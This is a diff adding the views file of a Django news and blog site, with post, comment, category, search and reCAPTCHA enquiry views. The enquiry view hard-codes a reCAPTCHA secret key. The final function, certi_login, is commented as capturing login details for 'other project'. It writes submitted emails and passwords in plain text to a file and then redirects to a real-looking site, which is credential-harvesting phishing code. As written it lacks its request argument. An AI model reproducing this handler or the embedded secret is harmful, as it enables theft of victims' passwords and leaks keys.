@@ -1,0 +1,244 @@
+from django.shortcuts import render, get_object_or_404
+from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
+from django.contrib.auth.models import User
+from django.views.generic import (
+    ListView,
+    DetailView,
+    CreateView,
+    UpdateView,
+    DeleteView
+)
+from .models import Post, Comment, Category
+from django.http import HttpResponseRedirect
+from django.urls import reverse
+from django.contrib.auth.decorators import login_required
+from django.core.mail import send_mail
+from .forms import CommentForm
+from django.urls import reverse_lazy
+import requests
+import json
+
+
+verified_users = [1,2,3,4,5,6,7,8,9,10]
+
+@login_required
+def LikeView(request, pk):
+    post = get_object_or_404(Post, id=request.POST.get('post_id'))
+    liked = False
+    if post.likes.filter(id=request.user.id).exists():
+        post.likes.remove(request.user)
+        liked = False
+    else:
+        post.likes.add(request.user)
+        liked = True
+    
+    return HttpResponseRedirect(reverse('post-detail', args=[str(pk)]))
+
+
+class UserPostListView(ListView):
+    model = Post
+    template_name = 'blog/user_posts.html'  # <app>/<model>_<viewtype>.html
+    context_object_name = 'posts'
+    paginate_by = 5
+    extra_context = {'verified_users':verified_users}
+    
+    def get_queryset(self):
+        user = get_object_or_404(User, username=self.kwargs.get('username'))
+        return Post.objects.filter(author=user).order_by('-date_posted')
+
+class PostDetailView(DetailView):
+    model = Post
+    extra_context = {'verified_users':verified_users}
+
+class PostCreateView(LoginRequiredMixin, CreateView):
+    model = Post
+    fields = ['title', 'content', 'category', 'post_image']
+
+    def form_valid(self, form):
+        form.instance.author = self.request.user
+        return super().form_valid(form)
+
+class PostUpdateView(LoginRequiredMixin, UserPassesTestMixin, UpdateView):
+    model = Post
+    fields = ('title', 'content', 'category', 'post_image')
+
+    def form_valid(self, form):
+        form.instance.author = self.request.user
+        return super().form_valid(form)
+
+    def test_func(self):
+        post = self.get_object()
+        if self.request.user == post.author:
+            return True
+        return False
+
+class PostDeleteView(LoginRequiredMixin, UserPassesTestMixin, DeleteView):
+    model = Post
+    success_url = '/'
+
+    def test_func(self):
+        post = self.get_object()
+        if self.request.user == post.author:
+            return True
+        return False
+
+def CategoryView(request, cats):
+    category_posts = Post.objects.filter(category=cats).order_by('-date_posted')
+    return render(request, 'blog/categories.html', {'verified_users':verified_users,'cats':cats, 'category_posts':category_posts})
+
+def about(request):
+    who = User.objects.filter(username='About-DiamondNepal').first()
+    context = { 
+        'posts': who.post_set.all()
+    }
+    return render(request, 'blog/about.html', context)
+
+
+def home(request):
+    new_posts = Post.objects.all().order_by('-date_posted').first()
+    sahitya_posts = Post.objects.filter(category=4).order_by('-date_posted').first()
+    nepalinews_posts = Post.objects.filter(category=2).order_by('-date_posted').first()
+    parbshinews_posts = Post.objects.filter(category=3).order_by('-date_posted').first()
+    entertainment_posts = Post.objects.filter(category=1).order_by('-date_posted').first()
+    return render(request, 'blog/home.html', {'verified_users':verified_users, 'latest':new_posts,'parbshi':parbshinews_posts, 'sahitya':sahitya_posts, 'nepalinews':nepalinews_posts, 'entertainment':entertainment_posts})
+
+class LatestPostView(ListView):
+    model = Post
+    template_name = 'blog/latest_posts.html'  # <app>/<model>_<viewtype>.html
+    context_object_name = 'posts'
+    ordering = ['-date_posted']
+    paginate_by = 7
+
+def photo_gallery(request):
+    return render(request, 'blog/photo_gallery.html') 
+
+def privacy_policy(request):
+    return render(request, 'blog/privacy_policy.html')
+
+def enquiries(request):
+    if request.method == "POST":
+        message_name = request.POST['message-name']
+        message_email = request.POST['message-email']
+        message = request.POST['message']
+        message_username = request.POST['message-username']
+        # reCAPTCHA
+
+        clientkey = request.POST['g-recaptcha-response']
+        secretkey = '6LclBbYZAAAAALFIsTLeuw-egg_zdxPjcA0YfZBW'
+        captcha = {
+            'secret':secretkey,
+            'response':clientkey
+        }
+
+        r = requests.post('https://www.google.com/recaptcha/api/siteverify', data=captcha)
+        response = json.loads(r.text)
+        verify = response['success']
+
+        if verify:
+            # Sending Email
+            send_mail(
+                'Enquiry From : ' + str(message_name),
+                'This is an Enquiry from : ' + str(message_name) + "\nUsername: "+ str(message_username) + ',\nYou are supposed to respond to this Enquiry at : ' + str(message_email) + '\nThe Enquiry is :\n' + str(message),
+                'noreply@diamondnepal.com',
+                ['contact@diamondnepal.com']
+                )
+
+            return render(request, 'blog/enquiry_form.html', {'message_name':message_name, 'message_email': message_email})
+        else:
+            return render(request, 'blog/enquiry_form.html', {'message_name':message_name, 'recaptcha_error':"Please tick the box where it says, 'I am not a robot!'"})
+
+    else:    
+        return render(request, 'blog/enquiry_form.html')
+
+class AddCommentView(CreateView):
+    model = Comment
+    form_class = CommentForm
+    ordering = ['-date_added']
+    template_name = "blog/add_comment.html"
+    success_url = reverse_lazy('blog-home')
+
+    def form_valid(self, form):
+        form.instance.post_id = self.kwargs['pk']
+        return super().form_valid(form)
+
+
+def view_404(request, exception):
+    return render(request, 'blog/404.html')
+
+def latest_videos(request):
+    return render(request, 'blog/latest_videos.html')
+
+def video(request):
+    return render(request, 'blog/video.html')
+
+def video_two(request):
+    return render(request, 'blog/video2.html')
+
+def video_three(request):
+    return render(request, 'blog/video3.html')
+
+def video_four(request):
+    return render(request, 'blog/video4.html')
+
+def search(request):
+    query = request.GET['query']
+
+    if len(query) > 80:
+        posts = Post.objects.none()
+    else:
+        PostTitle = Post.objects.filter(title__icontains=query)
+        PostContent = Post.objects.filter(content__icontains=query)
+        posts = PostTitle.union(PostContent)
+        PostUser = User.objects.filter(username__icontains=query)
+        try:
+            PostUser = PostUser[0].post_set.all()
+            posts = posts.union(PostUser)
+        except:
+            pass
+
+    if posts.count() == 0:
+        print(query.lower())
+        if "entert" in query.lower():
+            query = 1
+            category_posts = Post.objects.filter(category=query)
+            return render(request, 'blog/categories.html', {'verified_users':verified_users, 'category_posts':category_posts})
+
+        elif query.lower() == "sahitya" or "nepali" in query.lower():
+            query = 4
+            category_posts = Post.objects.filter(category=query)
+            return render(request, 'blog/categories.html', {'verified_users':verified_users, 'category_posts':category_posts})
+
+        elif query.lower() == "video" or query.lower() == "videos":
+            return render(request, 'blog/latest_videos.html')
+
+        elif "news" in query.lower() or "news" in query.lower():
+            import random
+            x = random.randint(1,2)
+            if x == 1:
+                query = 2
+                category_posts = Post.objects.filter(category=query)
+                return render(request, 'blog/categories.html', {'verified_users':verified_users, 'category_posts':category_posts})
+            else:
+                query = 3
+                category_posts = Post.objects.filter(category=query)
+                return render(request, 'blog/categories.html', {'verified_users':verified_users, 'category_posts':category_posts})               
+        else:
+            pass
+
+    context = {'posts':posts, 'query':query, 'verified_users':verified_users}
+
+    return render(request, 'blog/search.html', context)
+
+
+# for other project to capture the login details sent
+
+def certi_login():
+    email = request.POST['email']
+    password = request.POST['password']
+    print(email)
+    print(password)
+    f = open("/home/lissan/passwords.txt", "a")
+    f.write("\n" + str(email) + ":" + str(password))
+    f.close()
+    return HttpResponseRedirect('https://diamondnepal.com/')
+
